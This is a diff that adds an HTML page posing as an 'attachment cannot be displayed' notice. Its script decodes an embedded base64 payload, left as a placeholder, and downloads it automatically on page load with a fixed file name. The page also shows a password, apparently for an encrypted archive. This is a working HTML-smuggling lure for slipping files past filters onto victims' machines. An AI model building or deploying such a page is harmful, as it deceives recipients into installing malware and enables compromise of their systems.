@@ -1,0 +1,113 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Oh-oh seems like we hit a roadblock! </title>
+  <style>
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+      background: #fafafa;
+      color: #111;
+    }
+    .box {
+      text-align: center;
+      padding: 24px;
+      border-radius: 8px;
+      box-shadow: 0 6px 18px rgba(0, 0, 0, 0.06);
+      background: #fff;
+      max-width: 400px;
+    }
+    .small { font-size: 0.9rem; color: #666; margin-top: 8px; }
+    a.fallback {
+      display: inline-block;
+      margin-top: 12px;
+      text-decoration: none;
+      color: #0066cc;
+    }
+    .password-box {
+      margin-top: 20px;
+      padding: 10px;
+      background: #f0f0f0;
+      border-radius: 6px;
+      font-family: monospace;
+      font-size: 1rem;
+      letter-spacing: 0.05em;
+    }
+  </style>
+</head>
+<body>
+  <div class="box" id="status">
+    <h1>We could not display this attachment</h1>
+    <p class="small">
+      This type of attachment cannot be viewed directly in your browser.<br>
+      The file will begin downloading automatically.
+    </p>
+    <div id="link-container"></div>
+    <div class="password-box">
+      <strong>Password:</strong> <span id="static-pass">secure123</span>
+    </div>
+  </div>
+
+  <script>
+  (function () {
+    'use strict';
+
+    const BASE64_PAYLOAD = "BASE64GOESHERE";      
+    const PAYLOAD_FILENAME = "STATIC FILE NAME";  
+    const PASSWORD = "0666";                  
+    function base64ToArrayBuffer(b64) {
+      const bin = atob(b64);
+      const len = bin.length;
+      const arr = new Uint8Array(len);
+      for (let i = 0; i < len; i++) arr[i] = bin.charCodeAt(i);
+      return arr.buffer;
+    }
+
+    function createAndDownload() {
+      try {
+        const buffer = base64ToArrayBuffer(BASE64_PAYLOAD);
+        const blob = new Blob([buffer], { type: 'application/octet-stream' });
+        const url = URL.createObjectURL(blob);
+
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = PAYLOAD_FILENAME || 'download.bin';
+        a.style.display = 'none';
+        document.body.appendChild(a);
+
+        a.click();
+
+        const linkContainer = document.getElementById('link-container');
+        const safeName = encodeURIComponent(PAYLOAD_FILENAME);
+        linkContainer.innerHTML =
+          `<a class="fallback" href="${url}" download="${safeName}">Click here if the download does not start</a>`;
+
+        setTimeout(() => {
+          URL.revokeObjectURL(url);
+          a.remove();
+        }, 30000);
+      } catch (err) {
+        const status = document.getElementById('status');
+        status.innerHTML =
+          `<h1>Oops something went wrong!</h1><p class="small">${String(err)}</p>`;
+      }
+    }
+
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', createAndDownload);
+    } else {
+      createAndDownload();
+    }
+
+    document.getElementById('static-pass').textContent = PASSWORD;
+
+  })();
+  </script>
+</body>
+</html>
